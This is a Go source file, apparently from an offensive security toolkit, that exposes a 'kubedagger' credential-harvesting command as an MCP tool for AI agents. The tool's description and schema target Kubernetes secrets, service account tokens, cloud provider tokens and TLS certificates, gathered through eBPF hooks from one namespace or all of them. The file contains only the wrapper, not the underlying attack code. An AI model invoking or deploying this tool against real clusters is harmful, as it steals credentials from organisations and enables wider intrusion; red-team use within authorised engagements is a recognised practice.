package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type SecretsHarvestInput struct {
	Namespace string `json:"namespace,omitempty"`
	Source    string `json:"source,omitempty"`
	Format   string `json:"format,omitempty"`
	AllNS    bool   `json:"all_namespaces,omitempty"`
}

type SecretsHarvestTool struct {
	exec executor.Executor
}

func NewSecretsHarvest(exec executor.Executor) *SecretsHarvestTool {
	return &SecretsHarvestTool{exec: exec}
}

func (t *SecretsHarvestTool) Name() string { return "kubedagger_secrets_harvest" }

func (t *SecretsHarvestTool) Description() string {
	return "Harvest secrets and credentials from the cluster by intercepting kubelet volume mounts, environment variables, and projected service account tokens via eBPF hooks. Extracts K8s secrets, configmaps with credentials, cloud provider tokens, and TLS certificates."
}

func (t *SecretsHarvestTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"namespace": {
				"type": "string",
				"description": "Target namespace to harvest from"
			},
			"source": {
				"type": "string",
				"enum": ["env", "volume", "token", "configmap", "all"],
				"description": "Source type to harvest from (default: all)"
			},
			"format": {
				"type": "string",
				"enum": ["text", "json"],
				"description": "Output format"
			},
			"all_namespaces": {
				"type": "boolean",
				"description": "Harvest across all namespaces"
			}
		}
	}`)
}

func (t *SecretsHarvestTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input SecretsHarvestInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"secrets", "harvest"}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Source != "" {
		args = append(args, "--source", input.Source)
	}
	if input.Format != "" {
		args = append(args, "--format", input.Format)
	}
	if input.AllNS {
		args = append(args, "--all-namespaces")
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger secrets harvest failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger Secrets Harvest\n\n")
	if output == "" {
		sb.WriteString("No secrets found.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
